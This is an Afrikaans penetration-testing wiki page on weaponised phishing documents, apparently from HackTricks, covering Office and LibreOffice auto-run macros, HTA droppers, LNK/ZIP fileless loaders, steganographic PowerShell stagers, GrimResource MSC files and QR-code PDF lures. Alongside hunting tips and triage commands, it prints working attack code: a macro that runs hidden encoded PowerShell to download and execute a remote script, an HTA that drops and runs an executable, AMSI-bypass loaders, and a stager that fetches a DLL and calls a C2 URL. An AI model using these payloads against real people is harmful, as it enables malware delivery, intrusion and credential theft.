# Phishing-lêers en -dokumente

{{#include ../../banners/hacktricks-training.md}}

## Office-dokumente

Microsoft Word valideer lêerdata voordat dit ’n lêer oopmaak. Datavalidering word uitgevoer deur datastrukture volgens die OfficeOpenXML-standaard te identifiseer. As enige fout tydens die identifisering van die datastruktuur voorkom, sal die lêer wat ontleed word, nie oopgemaak word nie.

Word-lêers wat makro’s bevat, gebruik gewoonlik die `.docm`-uitbreiding. Dit is egter moontlik om die lêer te hernoem deur die lêeruitbreiding te verander en steeds die vermoë te behou om makro’s uit te voer.\
Byvoorbeeld, ’n RTF-lêer ondersteun nie makro’s nie, maar ’n DOCM-lêer wat na RTF hernoem is, sal deur Microsoft Word hanteer word en makro’s kan uitvoer.\
Dieselfde interne werking en meganismes geld vir alle sagteware in die Microsoft Office Suite (Excel, PowerPoint, ens.).

Jy kan die volgende opdrag gebruik om te kontroleer watter uitbreidings deur sekere Office-programme uitgevoer gaan word:

```bash
assoc | findstr /i "word excel powerp"
```

DOCX-lêers wat na ’n afgeleë sjabloon verwys (Lêer – Opsies – Byvoegings – Bestuur: Sjablone – Gaan) wat macros insluit, kan macros ook “uitvoer”.

### Eksterne beeldlaai

Gaan na: _Invoeg --> Vinnige dele --> Veld_\
_**Kategorieë**: Skakels en verwysings, **Veldname**: includePicture, en **Lêernaam of URL**:_ http://<ip>/whatever

![Office Documents - Eksterne beeldlaai: Gaan na: Invoeg -- Vinnige dele -- Veld](<../../images/image (155).png>)

### Macros-agterdeur

Dit is moontlik om macros te gebruik om arbitrêre kode vanuit die dokument uit te voer.

#### Outolaai-funksies

Hoe meer algemeen hulle is, hoe waarskynliker is dit dat die AV hulle sal opspoor.

- AutoOpen()
- Document_Open()

#### Voorbeelde van Macros-kode

```vba
Sub AutoOpen()
    CreateObject("WScript.Shell").Exec ("powershell.exe -nop -Windowstyle hidden -ep bypass -enc JABhACAAPQAgACcAUwB5AHMAdABlAG0ALgBNAGEAbgBhAGcAZQBtAGUAbgB0AC4AQQB1AHQAbwBtAGEAdABpAG8AbgAuAEEAJwA7ACQAYgAgAD0AIAAnAG0AcwAnADsAJAB1ACAAPQAgACcAVQB0AGkAbABzACcACgAkAGEAcwBzAGUAbQBiAGwAeQAgAD0AIABbAFIAZQBmAF0ALgBBAHMAcwBlAG0AYgBsAHkALgBHAGUAdABUAHkAcABlACgAKAAnAHsAMAB9AHsAMQB9AGkAewAyAH0AJwAgAC0AZgAgACQAYQAsACQAYgAsACQAdQApACkAOwAKACQAZgBpAGUAbABkACAAPQAgACQAYQBzAHMAZQBtAGIAbAB5AC4ARwBlAHQARgBpAGUAbABkACgAKAAnAGEAewAwAH0AaQBJAG4AaQB0AEYAYQBpAGwAZQBkACcAIAAtAGYAIAAkAGIAKQAsACcATgBvAG4AUAB1AGIAbABpAGMALABTAHQAYQB0AGkAYwAnACkAOwAKACQAZgBpAGUAbABkAC4AUwBlAHQAVgBhAGwAdQBlACgAJABuAHUAbABsACwAJAB0AHIAdQBlACkAOwAKAEkARQBYACgATgBlAHcALQBPAGIAagBlAGMAdAAgAE4AZQB0AC4AVwBlAGIAQwBsAGkAZQBuAHQAKQAuAGQAbwB3AG4AbABvAGEAZABTAHQAcgBpAG4AZwAoACcAaAB0AHQAcAA6AC8ALwAxADkAMgAuADEANgA4AC4AMQAwAC4AMQAxAC8AaQBwAHMALgBwAHMAMQAnACkACgA=")
End Sub
```

```vba
Sub AutoOpen()

  Dim Shell As Object
  Set Shell = CreateObject("wscript.shell")
  Shell.Run "calc"

End Sub
```

```vba
Dim author As String
author = oWB.BuiltinDocumentProperties("Author")
With objWshell1.Exec("powershell.exe -nop -Windowsstyle hidden -Command-")
 .StdIn.WriteLine author
 .StdIn.WriteBlackLines 1
```

```vba
Dim proc As Object
Set proc = GetObject("winmgmts:\\.\root\cimv2:Win32_Process")
proc.Create "powershell <beacon line generated>
```

#### Verwyder metadata handmatig

Gaan na **File > Info > Inspect Document > Inspect Document** om die Document Inspector oop te maak. Klik **Inspect** en dan **Remove All** langs **Document Properties and Personal Information**.

#### Doc-uitbreiding

Wanneer jy klaar is, kies die **Save as type**-aftreklys en verander die formaat van **`.docx`** na Word 97-2003 **`.doc`**.\
Doen dit omdat jy **nie makro's in 'n `.docx` kan stoor nie**, en daar 'n **stigma** **kleef aan** die makro-geaktiveerde **`.docm`**-uitbreiding (bv. die kleinkoonprentjie het 'n groot `!`, en sommige web-/e-pospoorte blokkeer dit heeltemal). Daarom is hierdie **verouderde `.doc`-uitbreiding die beste kompromie**.

#### Kwaadwillige Macro-opwekkers

- MacOS
  - [**macphish**](https://github.com/cldrn/macphish)
  - [**Mythic Macro Generator**](https://github.com/cedowens/Mythic-Macro-Generator)

## LibreOffice ODT-outomatiese makro's (Basic)

LibreOffice Writer-dokumente kan Basic-makro's insluit en dit outomaties laat uitvoer wanneer die lêer oopgemaak word deur die makro aan die **Open Document**-gebeurtenis te koppel (Tools → Customize → Events → Open Document → Macro…).<sup>[[1]](#references)</sup> 'n Eenvoudige reverse shell-makro lyk soos volg:

```vb
Sub Shell
    Shell("cmd /c powershell -enc BASE64_PAYLOAD"""")
End Sub
```

Let op die dubbele aanhalingstekens (`""`) binne die string – LibreOffice Basic gebruik dit om letterlike aanhalingstekens te ontsnap, dus bly payloads wat eindig op `...==""")` gebalanseerd, met beide die interne opdrag en die Shell-argument.

Afleweringswenke:

- Stoor as `.odt` en koppel die makro aan die dokumentgebeurtenis sodat dit onmiddellik loop wanneer die dokument oopgemaak word.
- Gebruik `--attach @resume.odt` wanneer jy met `swaks` e-pos stuur (die `@` is nodig sodat die lêer se grepe, en nie die lêernaamstring nie, as die aanhegsel gestuur word). Dit is noodsaaklik wanneer jy SMTP-bedieners misbruik wat arbitrêre `RCPT TO`-ontvangers sonder validering aanvaar.

## HTA-lêers

’n HTA is ’n Windows-program wat **HTML en skripttale (soos VBScript en JScript) kombineer**. Dit genereer die gebruikerskoppelvlak en loop as ’n "volledig vertroude" toepassing, sonder die beperkings van ’n blaaier se sekuriteitsmodel.

’n HTA word met **`mshta.exe`** uitgevoer, wat tipies saam met **Internet Explorer geïnstalleer** word; daarom is **`mshta` afhanklik van IE**. As dit dus gedeïnstalleer is, sal HTA’s nie kan loop nie.

```html
<--! Basic HTA Execution -->
<html>
  <head>
    <title>Hello World</title>
  </head>
  <body>
    <h2>Hello World</h2>
    <p>This is an HTA...</p>
  </body>

  <script language="VBScript">
    Function Pwn()
      Set shell = CreateObject("wscript.Shell")
      shell.run "calc"
    End Function

    Pwn
  </script>
</html>
```

```html
<--! Cobal Strike generated HTA without shellcode -->
<script language="VBScript">
  Function var_func()
  	var_shellcode = "<shellcode>"

  	Dim var_obj
  	Set var_obj = CreateObject("Scripting.FileSystemObject")
  	Dim var_stream
  	Dim var_tempdir
  	Dim var_tempexe
  	Dim var_basedir
  	Set var_tempdir = var_obj.GetSpecialFolder(2)
  	var_basedir = var_tempdir & "\" & var_obj.GetTempName()
  	var_obj.CreateFolder(var_basedir)
  	var_tempexe = var_basedir & "\" & "evil.exe"
  	Set var_stream = var_obj.CreateTextFile(var_tempexe, true , false)
  	For i = 1 to Len(var_shellcode) Step 2
  	    var_stream.Write Chr(CLng("&H" & Mid(var_shellcode,i,2)))
  	Next
  	var_stream.Close
  	Dim var_shell
  	Set var_shell = CreateObject("Wscript.Shell")
  	var_shell.run var_tempexe, 0, true
  	var_obj.DeleteFile(var_tempexe)
  	var_obj.DeleteFolder(var_basedir)
  End Function

  var_func
  self.close
</script>
```

## Dwing van NTLM-verifikasie

Daar is verskeie maniere om **NTLM-verifikasie “op afstand” af te dwing**. Jy kan byvoorbeeld **onsigbare beelde** by e-posse of HTML voeg waartoe die gebruiker toegang sal kry (selfs HTTP MitM?). Of stuur die slagoffer die **adres van lêers** wat **verifikasie sal aktiveer** bloot deur **die vouer oop te maak**.

**Kyk na hierdie idees en meer op die volgende bladsye:**


{{#ref}}
../../windows-hardening/active-directory-methodology/printers-spooler-service-abuse.md
{{#endref}}


{{#ref}}
../../windows-hardening/ntlm/places-to-steal-ntlm-creds.md
{{#endref}}

### NTLM Relay

Moenie vergeet dat jy nie net die hash of die verifikasie kan steel nie, maar ook **NTLM relay-aanvalle kan uitvoer**:

- [**NTLM Relay-aanvalle**](../pentesting-network/spoofing-llmnr-nbt-ns-mdns-dns-and-wpad-and-relay-attacks.md#ntml-relay-attack)
- [**AD CS ESC8 (NTLM relay na sertifikate)**](../../windows-hardening/active-directory-methodology/ad-certificates/domain-escalation.md#ntlm-relay-to-ad-cs-http-endpoints-esc8)

## LNK Loaders + ZIP-ingebedde Payloads (fileless-ketting)

Hoogs effektiewe veldtogte lewer ’n ZIP af wat twee wettige lokdokumente (PDF/DOCX) en ’n kwaadwillige .lnk bevat. Die truuk is dat die werklike PowerShell loader ná ’n unieke merker in die rou grepe van die ZIP gestoor word, en die .lnk dit uitsny en volledig in geheue uitvoer.<sup>[[2]](#references)</sup>

Tipiese vloei wat deur die .lnk PowerShell-eenreël geïmplementeer word:

1) Vind die oorspronklike ZIP in algemene paaie: Desktop, Downloads, Documents, %TEMP%, %ProgramData% en die ouergids van die huidige werkgids.
2) Lees die ZIP-grepe en vind ’n hardgekodeerde merker (bv. xFIQCV). Alles ná die merker is die ingebedde PowerShell-payload.
3) Kopieer die ZIP na %ProgramData%, pak dit daar uit en maak die lok-.docx oop om dit wettig te laat lyk.
4) Omseil AMSI vir die huidige proses: [System.Management.Automation.AmsiUtils]::amsiInitFailed = $true
5) Deobfuskeer die volgende stadium (bv. verwyder alle #-karakters) en voer dit in geheue uit.

Voorbeeld van ’n PowerShell-raamwerk om die ingebedde stadium uit te sny en uit te voer:

```powershell
$marker   = [Text.Encoding]::ASCII.GetBytes('xFIQCV')
$paths    = @(
  "$env:USERPROFILE\Desktop", "$env:USERPROFILE\Downloads", "$env:USERPROFILE\Documents",
  "$env:TEMP", "$env:ProgramData", (Get-Location).Path, (Get-Item '..').FullName
)
$zip = Get-ChildItem -Path $paths -Filter *.zip -ErrorAction SilentlyContinue -Recurse | Sort-Object LastWriteTime -Descending | Select-Object -First 1
if(-not $zip){ return }
$bytes = [IO.File]::ReadAllBytes($zip.FullName)
$idx   = [System.MemoryExtensions]::IndexOf($bytes, $marker)
if($idx -lt 0){ return }
$stage = $bytes[($idx + $marker.Length) .. ($bytes.Length-1)]
$code  = [Text.Encoding]::UTF8.GetString($stage) -replace '#',''
[Ref].Assembly.GetType('System.Management.Automation.AmsiUtils').GetField('amsiInitFailed','NonPublic,Static').SetValue($null,$true)
Invoke-Expression $code
```

Aantekeninge
- Aflewering misbruik dikwels subdomeine van betroubare PaaS-dienste (bv. *.herokuapp.com) en kan toegang tot payloads beperk (bedien onskadelike ZIP-lêers op grond van IP/UA).
- Die volgende stadium dekripteer dikwels base64/XOR-shellcode en voer dit via Reflection.Emit + VirtualAlloc uit om skyfspore tot die minimum te beperk.

Volharding wat in dieselfde ketting gebruik word
- COM TypeLib-kaping van die Microsoft Web Browser-beheer sodat IE/Explorer of enige toepassing wat dit insluit, die payload outomaties herbegin.<sup>[[2]](#references)[[4]](#references)</sup> Sien besonderhede en gereed-vir-gebruik-opdragte hier:

{{#ref}}
../../windows-hardening/windows-local-privilege-escalation/com-hijacking.md
{{#endref}}

Hunting/IOCs
- ZIP-lêers wat die ASCII-merkerstring (bv. xFIQCV) aan die argiefdata geheg bevat.
- .lnk wat ouer-/gebruikersvouers deurloop om die ZIP op te spoor en ’n lokdokument oopmaak.
- AMSI-peutering via [System.Management.Automation.AmsiUtils]::amsiInitFailed.
- Langlopende besigheids-e-posgesprekke wat eindig met skakels wat onder vertroude PaaS-domeine gehuisves word.

## LNK-lokmiddel-eerste staging → volharding met geskeduleerde taak → vertroude CPL-side-loading

Nog ’n herhalende patroon is ’n **dokument-nabootsende `.lnk`** wat onmiddellik ’n onskadelike lokmiddel oopmaak terwyl dit die werklike ketting in die agtergrond voorberei.<sup>[[3]](#references)</sup>

Waargenome werkvloei:
1. Die kortpad **doen hom voor as ’n PDF** en gebruik `conhost.exe` of ’n soortgelyke instaanprogram om ’n verduisterde PowerShell-aflaaier te begin.
2. PowerShell fragmenteer ooglopende tokens (`iw''r`, `g''c''i`, `r''e''n`, `c''p''i`, `&(g''cm sch*)`) sodat naïewe opsporing wat na `iwr`, `gci`, `ren`, `cpi` of `schtasks` soek, die opdrag miskyk.
3. Die stager laai **eers die lokdokument af**, maak dit vir die slagoffer oop en bou dan die kwaadwillige lêers in die agtergrond weer saam.
4. Payloads kan met **rommeluitbreidings** geskryf en daarna hernoem word deur vulkarakters te verwyder, wat die verskyning van ooglopende `.exe` / `.cpl`-artefakte vertraag.
5. Volharding word bewerkstellig met ’n **geskeduleerde taak wat elke minuut loop** en ’n vertroude gasheerbinêre lêer vanaf ’n pad skryfbaar deur die gebruiker begin.

Minimale leidrade om volgens hierdie patroon te jag:

```powershell
# Suspicious split-token PowerShell seen in LNK chains
iw''r
r''e''n
&(g''cm sch*) /create /Sc minute /tn GoogleErrorReport /tr "$env:PUBLIC\Fondue"
```

’n Nuttige staging-uitleg om te herken, is:
- `C:\Users\Public\<decoy>.pdf`
- `C:\Users\Public\<trusted>.exe`
- `C:\Users\Public\<malicious>.cpl` of `.dll`
- `C:\Windows\Tasks\<blob>.dat`

### Waarom die tweede stadium ongemerk bly

In die Rapid7-gevallestudie het die geskeduleerde taak **`Fondue.exe`** herhaaldelik vanaf `C:\Users\Public\` geloods. Omdat **`APPWIZ.cpl`** langsaan geplaas is en **`RunFODW`** uitgevoer het, het die vertroude Microsoft-binêre die aanvaller se CPL gelaai in plaas van die wettige stelselk kopie.

Die CPL het toe:
- ’n **AES-256-CBC**-blob gelees vanaf `C:\Windows\Tasks\editor.dat`
- Dit deur **Windows CNG / `bcrypt.dll`** gedekripteer
- Uitvoerbare geheue toegewys en die gedekripteerde shellcode daarheen gekopieer
- Dit indirek uitgevoer deur die shellcode-wyser as die terugroepfunksie vir **`EnumUILanguagesW`** deur te gee

Daardie laaste stap is afsonderlik die moeite werd om na te speur: malware vermy dikwels ’n direkte `((void(*)())buf)()`-sprong en misbruik eerder ’n **wettige WinAPI wat ’n terugroepfunksie aanvaar** om uitvoering oor te dra.

Die gedekripteerde loonvrag in hierdie veldtog was **Donut**-shellcode, wat toe die finale PE volledig in geheue gekarteer en **AMSI/WLDP/ETW** in die huidige proses gelap het voordat dit uitvoering oorgedra het. Vir meer inligting oor side-loading en verwerking ná uitvoering in geheue, sien:

{{#ref}}
../../windows-hardening/windows-local-privilege-escalation/dll-hijacking/README.md
{{#endref}}

{{#ref}}
../../windows-hardening/av-bypass.md
{{#endref}}

Praktiese leidrade om na te speur:
- `.lnk` wat `powershell.exe` of `conhost.exe` begin, gevolg deur ’n sigbare lokdokument.
- Kortstondige aflaaie na **`C:\Users\Public\`**, gevolg deur onmiddellike hernoemings vanaf onsinnige lêeruitbreidings.
- Geskeduleerde take met onopvallende name soos `GoogleErrorReport` wat vanaf **skryfbare gebruikersgidse** uitgevoer word.
- Vertroude binaries wat **`.cpl` / `.dll`**-lêers uit dieselfde nie-stelselgids laai.
- Base64-teksblobs wat onder **`C:\Windows\Tasks\`** geskryf en daarna deur die side-loaded module gelees word.

## Steganografie-afgebakende loonvragte in beelde (PowerShell-stager)

Onlangse loader-kettings lewer ’n verduisterde JavaScript/VBS wat ’n Base64-PowerShell-stager dekodeer en laat loop. Daardie stager laai ’n beeld af (dikwels GIF) wat ’n Base64-geënkodeerde .NET-DLL bevat wat as gewone teks tussen unieke begin-/eindmerkers versteek is. Die skrip soek na hierdie afbakeningsmerkers (voorbeelde wat in die wild gesien is: «<<sudo_png>> … <<sudo_odt>>>»), haal die teks tussenin uit, dekodeer dit met Base64 na grepe, laai die assembly in geheue en roep ’n bekende toegangspuntmetode met die C2-URL aan.<sup>[[5]](#references)</sup>

Werkvloei
- Stadium 1: Geargiveerde JS/VBS-dropper → dekodeer ingebedde Base64 → begin PowerShell-stager met -nop -w hidden -ep bypass.
- Stadium 2: PowerShell-stager → laai beeld af, haal Base64 tussen die merkers uit, laai die .NET-DLL in geheue en roep sy metode aan (bv. VAI) met die C2-URL en opsies as argumente.
- Stadium 3: Loader haal die finale loonvrag op en spuit dit tipies in deur middel van process hollowing in ’n vertroude binêre (gewoonlik MSBuild.exe).<sup>[[7]](#references)[[8]](#references)</sup> Lees hier meer oor process hollowing en uitvoering deur ’n vertroude nutsprogram as tussenganger:

{{#ref}}
../../reversing/common-api-used-in-malware.md
{{#endref}}

PowerShell-voorbeeld om ’n DLL uit ’n beeld te haal en ’n .NET-metode in geheue aan te roep:

<details>
<summary>PowerShell-stegano-loonvragonttrekker en -laaier</summary>

```powershell
# Download the carrier image and extract a Base64 DLL between custom markers, then load and invoke it in-memory
param(
  [string]$Url    = 'https://example.com/payload.gif',
  [string]$StartM = '<<sudo_png>>',
  [string]$EndM   = '<<sudo_odt>>',
  [string]$EntryType = 'Loader',
  [string]$EntryMeth = 'VAI',
  [string]$C2    = 'https://c2.example/payload'
)
$img = (New-Object Net.WebClient).DownloadString($Url)
$start = $img.IndexOf($StartM)
$end   = $img.IndexOf($EndM)
if($start -lt 0 -or $end -lt 0 -or $end -le $start){ throw 'markers not found' }
$b64 = $img.Substring($start + $StartM.Length, $end - ($start + $StartM.Length))
$bytes = [Convert]::FromBase64String($b64)
$asm = [Reflection.Assembly]::Load($bytes)
$type = $asm.GetType($EntryType)
$method = $type.GetMethod($EntryMeth, [Reflection.BindingFlags] 'Public,Static,NonPublic')
$null = $method.Invoke($null, @($C2, $env:PROCESSOR_ARCHITECTURE))
```

</details>

Notas
- Dit is ATT&CK T1027.003 (steganography/marker-hiding).<sup>[[6]](#references)</sup> Merkers verskil tussen veldtogte.
- AMSI/ETW-omseiling en string-deobfuskering word gewoonlik toegepas voordat die assembly gelaai word.
- Hunting: skandeer afgelaaide beelde vir bekende skeidingstekens; identifiseer PowerShell-prosesse wat toegang tot beelde kry en onmiddellik Base64-blokke dekodeer.

Sien ook stego-gereedskap en carving-tegnieke:

{{#ref}}
../../stego/workflow/README.md#quick-triage-checklist-first-10-minutes
{{#endref}}

## JS/VBS-droppers → Base64 PowerShell-staging

’n Algemene eerste fase is ’n klein, sterk geobfuskeerde `.js`- of `.vbs`-lêer wat in ’n argief afgelewer word. Die enigste doel daarvan is om ’n ingebedde Base64-string te dekodeer en PowerShell met `-nop -w hidden -ep bypass` te begin om die volgende fase oor HTTPS te inisieer.<sup>[[5]](#references)</sup>

Basiese logika (abstrak):
- Lees die inhoud van die eie lêer
- Vind ’n Base64-blok tussen rommelstringe
- Dekodeer na ASCII PowerShell
- Voer dit uit met `wscript.exe`/`cscript.exe` wat `powershell.exe` aanroep

Hunting-leidrade
- Geargiveerde JS/VBS-aanhegsels wat `powershell.exe` begin met `-enc`/`FromBase64String` in die opdragreël.
- `wscript.exe` wat `powershell.exe -nop -w hidden` vanaf tydelike gebruikersgidse begin.

## MSC-dokumente as uitvoeringshouers (GrimResource)

Microsoft Management Console-lêers (`.msc`) is XML-konsoledefinisies wat gewoonlik met `mmc.exe` oopgemaak word. **GrimResource** bewapen ’n `StringTable`-verwysing na ’n `apds.dll`-hulpbron wat ’n ou XSS-primitief bevat, sodat JavaScript binne `mmc.exe` loop wanneer ’n gebruiker die vervaardigde konsole oopmaak. Waargenome voorbeelde het `transformNode`-gebaseerde obfuskering met **DotNetToJScript** gekombineer om ’n .NET-loonvrag te instansieer sonder die gewone Office-makropad.<sup>[[9]](#references)</sup>

Vir statiese triage, behandel ’n onbetroubare MSC as teks en moet dit **nie** dubbelklik nie:<sup>[[9]](#references)</sup>

```bash
file lure.msc
xmllint --format lure.msc > lure.formatted.xml
grep -Eina 'apds\.dll|res://|StringTable|transformNode|ActiveXObject|FromBase64String' lure.formatted.xml
strings -el lure.msc | grep -Ei 'powershell|cmd\.exe|http|base64'
```

Hoësein-sterk runtime-pivots is wanneer `mmc.exe` die CLR of scriptkomponente laai, netwerkverbindings skep, of `powershell.exe`, `cmd.exe`, `wscript.exe`, `cscript.exe`, `mshta.exe`, `rundll32.exe` of ’n onverwagte uitvoerbare lêer begin. Die formaat is wettig, dus behoort opsporings **oorsprong + verdagte XML-/script-inhoud + `mmc.exe`-gedrag** met mekaar te korreleer, eerder as om elke MSC te blokkeer.<sup>[[9]](#references)</sup>

## PDF-/QR-herleidings en payload-beheer

’n PDF het nie ’n exploit nodig om nuttig te wees nie. Onlangse veldtogte plaas ’n **QR-kode of gewone skakel** in ’n dokument wat onskuldig lyk, lei die blaaiersessie weg van e-posbeheermaatreëls en pas die bestemming met die ontvanger se e-posadres aan. Microsoft het PDFs uit 2025 gedokumenteer waarvan die QR-URL’s uniek per ontvanger was en na RaccoonO365-infrastruktuur vir die oes van aanmeldbewyse gelei het; ’n parallelle ketting het IP-/omgewingsbeheer gebruik om ’n JavaScript-/MSI-pad aan geselekteerde besoekers terug te gee, maar ’n onskadelike PDF aan skandeerders of nie-toegelate kliënte.<sup>[[10]](#references)</sup>

Triageer beide PDF-aksies en gerenderde QR-kodes. ’n QR-kode kan as vektorgrafika geteken wees eerder as as ’n onttrekbare prent gestoor word, dus moet elke bladsy gerasteriseer word, benewens die onttrekking van ingebedde prente:

```bash
pdfid.py lure.pdf
pdfdetach -list lure.pdf
qpdf --qdf --object-streams=disable lure.pdf expanded.pdf
grep -aE '/(URI|OpenAction|AA|Launch|EmbeddedFile)|https?://' expanded.pdf
pdfimages -png lure.pdf image
pdftoppm -png -r 300 lure.pdf page
zbarimg --quiet image-*.png page-*.png
```

Inspekteer gedekodeerde bestemmings en aansture vanaf ’n geïsoleerde ontledingstelsel sonder om te staaf. Nuttige kenmerke om na te speur, sluit in QR-only-PDF’s met byna leë e-posliggame, die ontvanger se e-posadres wat in ’n navraagparameter ingebed is, verskeie aansture deur betroubare gasheerplatforms, en verskillende inhoud wat volgens IP, geoligging, koekies, verwysende bladsy of user agent teruggestuur word. Vergelyk versoeke met beheerde profiele, want ’n enkele sandbox-opvraging kan slegs die lokmiddel ontvang.<sup>[[10]](#references)</sup>

## Windows-lêers om NTLM-hashes te steel

Gaan die bladsy oor **plekke om NTLM-creds te steel** na:

{{#ref}}
../../windows-hardening/ntlm/places-to-steal-ntlm-creds.md
{{#endref}}




## References

- [1] [HTB Job – LibreOffice-makro → IIS-webshell → GodPotato](https://0xdf.gitlab.io/2026/01/26/htb-job.html)
- [2] [Check Point Research – ZipLine-veldtog: ’n Gesofistikeerde uitvissingaanval wat Amerikaanse maatskappye teiken](https://research.checkpoint.com/2025/zipline-phishing-campaign/)
- [3] [Rapid7 – Malware à la Mode: Nasporing van Dropping Elephant se tradecraft deur ’n China-tema-laaierketting](https://www.rapid7.com/blog/post/tr-malware-tracking-dropping-elephant-tradecraft-china-themed-loader-chain)
- [4] [Kaping van die TypeLib – Nuwe COM-volhardingstegniek (CICADA8)](https://cicada-8.medium.com/hijack-the-typelib-new-com-persistence-technique-32ae1d284661)
- [5] [Unit 42 – PhantomVAI Loader lewer ’n verskeidenheid infostealers](https://unit42.paloaltonetworks.com/phantomvai-loader-delivers-infostealers/)
- [6] [MITRE ATT&CK – Steganography (T1027.003)](https://attack.mitre.org/techniques/T1027/003/)
- [7] [MITRE ATT&CK – Process Hollowing (T1055.012)](https://attack.mitre.org/techniques/T1055/012/)
- [8] [MITRE ATT&CK – Trusted Developer Utilities Proxy Execution: MSBuild (T1127.001)](https://attack.mitre.org/techniques/T1127/001/)
- [9] [Elastic Security Labs – GrimResource: Microsoft Management Console vir aanvanklike toegang en ontduiking](https://www.elastic.co/security-labs/threat-command/grimresource)
- [10] [Microsoft Security Blog – Bedreigingsakteurs buit belastingseisoen uit om belasting-tema-uitvissingveldtogte te ontplooi](https://www.microsoft.com/en-us/security/blog/2025/04/03/threat-actors-leverage-tax-season-to-deploy-tax-themed-phishing-campaigns/)
{{#include ../../banners/hacktricks-training.md}}
